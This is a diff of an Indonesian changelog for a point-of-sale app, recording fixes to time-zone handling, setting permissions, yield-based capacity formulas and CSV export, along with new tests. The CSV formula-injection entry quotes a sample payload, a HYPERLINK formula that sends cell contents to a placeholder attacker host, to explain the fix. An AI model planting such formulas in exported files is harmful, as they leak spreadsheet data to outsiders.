@@ -15,9 +15,15 @@ Belum dirilis. Bagian ini menggabungkan tiga rangkaian pekerjaan:
 3. **Perbaikan tombol "Masuk"** pada layar login.
 4. **Perbaikan integritas retur** dari analisis `docs/11`: pagar retur berulang (#1), snapshot konsumsi per baris (#2),
    dan `forceConsumeRaw` yang akhirnya dihormati mesin BOM (#3).
+5. **Sisa Sprint 1/2 `docs/11`**: zona waktu toko (#4), permission per blok setting (#7), CSV formula injection (#8),
+   dan satu rumus kapasitas yang menghormati `yield_pct` (#11).
 
 ### Ditambahkan
 
+- **8 tes regresi zona waktu (6) & temuan Sprint 2 (4 tes API)** — 67 → **77 tes**: `server/tests/datetime.test.js`
+  (offset & hari bisnis, fallback zona ngawur, `addDays`, cache zona toko, nomor struk per zona) dan 4 tes API
+  (zona waktu laporan + nomor struk + filter tanggal; permission per blok setting; netralisasi CSV; satu rumus kapasitas).
+  Keempatnya dijalankan terhadap kode lama → **4 failing**, membuktikan tesnya menangkap bug.
 - **6 tes regresi snapshot BOM & `forceConsumeRaw`** (61 → **67 tes**): 4 di `server/tests/stock.test.js`
   (mesin BOM memotong bahan walau stok jadi ada; retur memakai snapshot walau resep diubah; retur produk
   `make_to_order` mengembalikan bahan; data lama tanpa snapshot tetap bisa diretur) dan 2 di
@@ -49,6 +55,35 @@ Belum dirilis. Bagian ini menggabungkan tiga rangkaian pekerjaan:
 
 ### Diperbaiki
 
+- **Zona waktu: `stores.timezone` akhirnya dipakai** (temuan P0 #4). Dulu `created_at` disimpan UTC tetapi
+  semua batas hari dihitung dari UTC atau `localtime` **server**, sehingga pada VPS/Vercel ber-TZ UTC:
+  transaksi 00:00–06:59 WIB masuk ke tanggal sebelumnya (hilang dari "hari ini"), grafik jam sibuk geser
+  7 jam, dan nomor struk berganti hari pukul 07:00 WIB. Modul baru `server/src/lib/tz.js`
+  (`businessDay`, `businessHour`, `tzOffsetSql`, `dayBoundsUtc`, `storeTimezone` + cache yang dibuang saat
+  zona waktu disunting) sekarang menjadi satu-satunya sumber hari bisnis:
+  - laporan (`/reports/*`): rentang default 30 hari **bisnis toko**, `date(created_at, '+07:00')`, `by_hour`
+    memakai jam toko, tanggal proyeksi kehabisan juga;
+  - nomor struk & nomor PO memakai hari bisnis toko, bukan tanggal UTC;
+  - filter tanggal `GET /api/sales` & `GET /api/stock/movements`: `YYYY-MM-DD` dari UI = hari toko;
+  - zona waktu tidak dikenal (salah ketik di Pengaturan) jatuh ke `Asia/Jakarta`, tidak mematahkan laporan.
+  **Bukti**: struk pukul 01:00 WIB masuk hari WIB-nya dengan `by_hour = [1]` (bukan `[18]`) dan 0 struk di
+  tanggal UTC-nya; 6 tes baru di `server/tests/datetime.test.js` (5 di antaranya gagal di kode lama).
+- **Permission per blok setting tidak ditegakkan** (temuan P1 #7). `PUT /api/settings/:key` digerbangi
+  `setting.store` **plus** klausa `|| perms.includes('setting.store')` yang selalu benar, sehingga pemilik hak
+  profil toko bisa menurunkan PPN (`setting.tax`) atau mengganti tema (`setting.theme`). Kini rute menerima
+  keempat hak `setting.*` dan peta blok→permission yang memutuskan. **Bukti**: role `manager` ber-`setting.store`
+  saja → `PUT /settings/tax` & `/settings/theme` & `/settings/receipt` = **403**, `/settings/store` = 200, PPN tetap 11%.
+- **CSV formula injection pada ekspor laporan** (temuan P1 #8). `customer_name`/`note` diisi bebas di layar kasir;
+  nilai seperti `=HYPERLINK("http://evil.example/?c="&A1,"Klik")` dulu diekspor apa adanya dan **dieksekusi**
+  spreadsheet. `csvCell()` kini memberi awalan apostrof untuk teks yang dimulai `=`, `+`, `-`, `@`, TAB, atau CR,
+  sementara nilai bertipe angka tetap numerik (kolom uang & laba tidak berubah).
+- **Dua dari tiga rumus kapasitas mengabaikan `yield_pct`** (temuan P2 #11). `items.js#maxServable()` dan
+  `stockhealth.js#rawCapacity()` menulis ulang rumus tanpa membagi `yield_pct`, jadi `/items/:id/simulate` dan
+  `serve_capacity`/status alert **dua kali lebih optimis** dari mesin stok untuk produk ber-yield < 100%.
+  Sekarang keduanya memakai `bom.js#rawCapacity()` (satu rumus; resep dimuat sekali, tanpa N+1) dan
+  `yield_pct` di luar 1–100 ditolak **400** saat membuat/menyunting barang (dulu di-clamp diam-diam).
+  **Bukti**: resep 10 gr, `yield_pct = 50`, stok bahan 1.000 gr → katalog/simulate/health sama-sama **50 porsi**
+  (sebelumnya 50/100/100).
 - **Retur memakai resep *hari ini*, bukan yang benar-benar terpotong saat jual** (temuan P0 #2 di
   [`docs/11`](docs/11-analisis-2026-09-17.md)). Dulu `refundLine()` menghitung ulang dengan `planStockImpact`
   memakai resep & `cost_price` **saat retur**, walaupun teks di UI menjanjikan snapshot. Karena resep/harga
@@ -174,13 +209,11 @@ Belum dirilis. Bagian ini menggabungkan tiga rangkaian pekerjaan:
 
 ### Diketahui / belum
 
-- Perbaikan **zona waktu** (memakai `stores.timezone` untuk `created_at`, laporan harian, nomor struk,
-  dan filter tanggal) belum dikerjakan — lihat `docs/10` §2 untuk dampak & contohnya.
 - **Migrasi skema bernomor versi** (rollback/backfill/rebuild tabel) dan **shift kas** belum ada; urutan prioritasnya ada di `docs/10` §2.
-- **Sprint 1/2 (rencana, tercantum di `docs/11`)**: ~~retur berulang tanpa batas~~, ~~retur berbasis snapshot~~,
-  ~~`forceConsumeRaw` yang diabaikan mesin BOM~~ (ketiganya sudah diperbaiki), sisa: zona waktu sisi laporan,
-  permission per blok setting, CSV formula injection, 2 dari 3 rumus kapasitas yang mengabaikan `yield_pct`,
-  dan gating auto-seed Vercel.
+- **Sprint 1/2 (rencana, tercantum di `docs/11`)**: ~~retur berulang~~, ~~snapshot retur~~, ~~`forceConsumeRaw`~~,
+  ~~zona waktu laporan~~, ~~permission per blok setting~~, ~~CSV injection~~, ~~rumus kapasitas `yield_pct`~~ — semuanya
+  sudah diperbaiki. Sisa Sprint 2: gating auto-seed Vercel (#10), `/bootstrap/lite` + SSE stok (#15),
+  dan sinkronisasi dokumen sisa (#14).
 
 ## [0.1.0] — 2026-09-16
 
